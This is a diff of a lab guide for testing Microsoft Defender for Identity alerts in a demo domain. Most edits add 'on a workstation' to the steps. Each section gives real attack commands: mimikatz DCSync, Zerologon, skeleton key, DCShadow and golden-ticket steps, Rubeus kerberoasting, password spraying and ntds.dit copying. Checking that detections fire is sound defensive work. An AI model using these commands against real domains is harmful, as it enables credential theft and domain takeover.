@@ -17,7 +17,7 @@ This reconnaissance is used by attackers to map your network structure and targe
 
 There are several query types in the DNS protocol. This Defender for Identity security alert detects suspicious requests, either requests using an AXFR (transfer) originating from non-DNS servers, or those using an excessive number of requests.
 
-From a command line run :  
+From a command line on a workstation run :  
   
 *Nslookup*  
 *server MSDemoDC01.msdemo.local*  
@@ -34,7 +34,7 @@ Detail in the alert:
 ## 2 - User and IP address reconnaissance  
 In this detection, an alert is triggered when an SMB session enumeration is performed against a domain controller; users and computers need at least to access the sysvol share in order to retreive GPOs. Attacker can use this information to know where users recently logged on and move laterally in the network to get to a specific sensitive account.  
 
-From a command line run :    
+From a command line on a workstation run :    
 
 *NetSess.exe MSDemo-DC01.msdemo.local*  
 
@@ -51,7 +51,7 @@ Detail in the alert:
 ## 3 - User and group membership reconnaissance (SAMR)  
 In this detection, User and group membership reconnaissance are used by attackers to map the directory structure and target privileged accounts for later steps in their attack using SAMR protocol.
 
-From a command line with proper permissions, run:  
+From a command line on a workstation with proper permissions, run:  
    
 *net user /domain*  
 *net group /domain*  
@@ -70,7 +70,7 @@ Detail in the alert:
 ## 4 - Security principal reconnaissance (LDAP)  
 In this detection, MDI looks for LDAP security principal reconnaissance which is commonly used as the first phase of a Kerberoasting attack. Kerberoasting attacks are used to get a target list of Security Principal Names (SPNs), which attackers then attempt to get Ticket Granting Server (TGS) tickets for.
 
-From a command line with proper permissions, run the tools from the French Security Agency (https://www.linkedin.com/company/anssi-fr/) for data collection:   
+From a command line on a workstation with proper permissions, run the tools from the French Security Agency (https://www.linkedin.com/company/anssi-fr/) for data collection:   
   
 *Oradad.exe*  
 
@@ -100,7 +100,7 @@ Detail in the alert (failed logon attempt):
 ## 6 - Active Directory attributes reconnaissance (LDAP)  
 Active Directory LDAP attributes reconnaissance is used by attackers to gain critical information about the domain environment, such as accounts with DES or RC4 kerberos cipher, accounts with Kerberos Pre-Authentication disabled and service account configured woth Uncosntrainted Keberos Delegation.
 
-From adsisearcher (PowerShell) or any ldap browser such as ldp.exe set the following ldap filters :  
+On a workstation, from adsisearcher (PowerShell) or any ldap browser such as ldp.exe set the following ldap filters :  
 
 *(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2097152)) FindAll()* => Enumerate accounts with Kerberos DES enabled
 
@@ -127,7 +127,7 @@ In this alert, Attacker makes Kerberos requests using a list of names to try to 
 
 Build a users.txt list of names by merging some names from https://github.com/jeanphorn/wordlist/blob/master/usernames.txt and add some valid name from your organisation.
 
-Then, run the following command from a PowerShell session:  
+Then, run the following command from a PowerShell session on a workstation :  
 
 Import-Module .\adlogin.ps1
 adlogin users.txt msdemo.local P@ssw0rd!
@@ -145,7 +145,7 @@ Detail in the alert:
 # 8 - Suspected AS-REP Roasting attack
 In this detection, MDI looks if an Attacker use tools to detect accounts with their Kerberos preauthentication disabled and he sends AS-REQ requests without the encrypted timestamp. In response the attacker receives AS-REP messages with TGT data, which may be encrypted with an insecure algorithm such as RC4, and save them for later use in an offline password cracking attack (similar to Kerberoasting) and expose plaintext credentials.
 
-From a comand line run:  
+From a comand line on a workstation run:  
 
 *Rubeus.exe kerberoast*  
 *Rubeus.exe kerberoast /tgtdeleg*  
@@ -164,7 +164,7 @@ Detail in the alert:
 # 9 - Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack
 In this detection, an alert is triggered when many authentication failures occur using Kerberos, NTLM, or use of a password spray is detected. Using Kerberos or NTLM, this type of attack is typically committed either horizontal, using a small set of passwords across many users, vertical with a large set of passwords on a few users, or any combination of the two.
 
-From a command line run :
+From a command line on a workstation run :
 
 *net user /domain >users.txt* => to retrieve the list of users in your domain and the result needs to be in one columm
 
@@ -222,7 +222,7 @@ DPAPI is used by Windows to securely protect passwords saved by browsers, encryp
 This is needed when a user password is reset, the blob with sensitive data cannot be decrypted with the new password so a DC must retrieve the data using the master key.  
 Attackers can use the master key to decrypt any secrets protected by DPAPI on all domain-joined machines. In this detection, a MDI alert is triggered when the DPAPI is used to retrieve the backup master key.  
 
-From a command line run :  
+From a command line on workstation run with and admin account :  
   
 *mimikatz # privilege::debug*  
 *mimikatz # lsadump::backupkeys /system:msdemo-DC01 /export*  
@@ -244,7 +244,7 @@ In this alert, the learned behavior of previous KRB_ERR message encryption from 
 
 **Be careful, never run an untrusted tools on a prodcution DC! Once the DC is impacted, there is no easy rollback, the DC has to be depromoted!**  
 
-From a command line with a shell on DC, run as AD admin :
+From a command line on a workstation with a shell on DC, run as AD admin :
 
 *mimikatz # privilege::debug* 
 *mimikatz # misc::skeleton*  => "mimikatz" should be the master password  
@@ -258,7 +258,7 @@ Detail in the alert:
 ## 13 - Suspected Neltogon privilege elevation attempt (CVE-2020-1472 exploitation)  
 The alert is triggered if an attacker attempts to establish a vulnerable Netlogon secure channel connection to a DC, using the Netlogon Remote Protocol (MS-NRPC), also known as Netlogon Elevation of Privilege Vulnerability.
 
-From a command line run:  
+From a command line on a workstation run with a local admin account: 
 
 *mimikatz # privilege::debug*  
 *mimikatz # lsadump::zerologon /server:msdemo-DC01.msdemo.local /account:msdemo-DC01$ /exploit*  
@@ -272,7 +272,7 @@ Detail in the alert:
 ## 14 - Suspicious network connection over Encrypting File System Remote Protocol
 This detection is triggered when an attacker tries to take over an AD Domain by exploiting a flaw in the Encrypting File System Remote (EFSRPC) Protocol.
 
-From a command line run:  
+From a command line on a workstation run with a local admin account:  
 
 *mimikatz # privilege::debug*  
 *mimikatz # misc::efs /server:10.4.0.100 /connect:10.4.0.13 /noauth*  
@@ -287,7 +287,7 @@ Detail in the alert:
 If an attacker has the "DS-Replication-Get-Changes-All" permission for example, he can initiate a replication request to retrieve the data stored in Active Directory such as the krbtgt's password hash.  
 In this detection, an alert is triggered when a replication request is initiated from a computer that isn't a DC.  
 
-From a command line run with a least local admin account :  
+From a command line on a workstation run with a least local admin account :  
 
 *mimikatz # privilege::debug*  
 *mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to retrieve the krbtgt's password hash and move to a golden ticket attack
@@ -305,7 +305,7 @@ In the alert Compay Segundo failed to retrieve the DCsync (not enough permission
 ## 16 - Suspected DCShadow attack (domain controller promotion) & (domain controller replication request)
 Two alerts are available but let's focus only on the "Domain controller replication request" alert; in this scenario, attackers strive to initiate a malicious replication request, allowing them to change Active Directory objects on a genuine DC, which can give the attackers persistence in the domain.
 
-From a command line run with AD admin account :  
+From a command line on a workstation run with AD admin account :  
 
 *mimikatz # privilege::debug*  
 *mimikatz # lsadump::dcshadow /object:krbtgt /attribute=ntPwdHistory /value:0000000000*  
@@ -320,7 +320,7 @@ Detail in the alert :
 ## 17 - Remote code execution attempts  
 MDI detects PSexec, Remote WMI, and PowerShell connections from a client machine to a DC. Attackers can execute remote commands on your DC or AD FS server to create persistence, collect cata or perform a denial of service (DOS).
 
-From a command line run with AD admin account :  
+From a command line on a workstation run with AD admin account :  
 
 *PSExec.exe -s -i \\msdemo-dc01 powershell.exe*  => to start a PowerShell session on DC
 
@@ -333,7 +333,7 @@ Detail in the alert :
 ## 18 - Data exfiltration over SMB
 This alert is triggered when suspicious transfers of data are observed from your monitored DCs, such as when an attacker copies the ntds.dit file from a DC to a workstation.
 
-From a command line run with AD admin account :  
+From a command line on a workstation run with AD admin account :  
 *PSEexec -s -i \\msdemo-DC01 cmd.exe* => to get a cmd session on a DC  
 *Esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit* => to get a copy of the ntds.dit file for an exfiltration  
 *copy c:ntds.dit to z:* => copy the ntds.dit file from the DC to your workstation (Z:)  
@@ -349,9 +349,10 @@ Keep in mind that MDI can also track files uploaded from workstation or server t
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image32.png)  
 
 ## 19 - Suspected Golden Ticket usage (encryption downgrade) & (nonexistent account) & (Time anomaly) etc..
-MDI can detect 6 types of Golden Ticket attack; let see 3 of them. Using the krbtgt's password hash from the DCsync; attackers can now create a Kerberos ticket granting ticket (TGT) that provides authorization to any resource and set the ticket expiration to any arbitrary time. This fake TGT is called a "Golden Ticket" and allows attackers to achieve network persistence.  
+MDI can detect 6 types of Golden Ticket attack; let see 2 of them.  
+Using the krbtgt's password hash from the DCsync; attackers can now create a Kerberos ticket granting ticket (TGT) that provides authorization to any resource and set the ticket expiration to any arbitrary time. This fake TGT is called a "Golden Ticket" and allows attackers to achieve network persistence.  
 
-From a command line run with local admin account on workstation:  
+From a command line on a workstation, run with local admin account:  
 
 *mimikatz # privilege::debug*  
 *mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to get the krbgt's password hash needed for the /rc4:...  
@@ -372,8 +373,8 @@ Tools available from : https://github.com/gentilkiwi/mimikatz/releases
 
 Detail in the alert :  
 
-![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image34.png)  
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image35.png)  
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image36.png)  
 
 ## 20 - Suspicious additions to sensitive groups
 Attackers could add users to highly privileged groups to gain access to more resources, and gain persistency. This alert needs a machine learning period (such as : this user usually does not perform this addition to sensitive groups...etc).
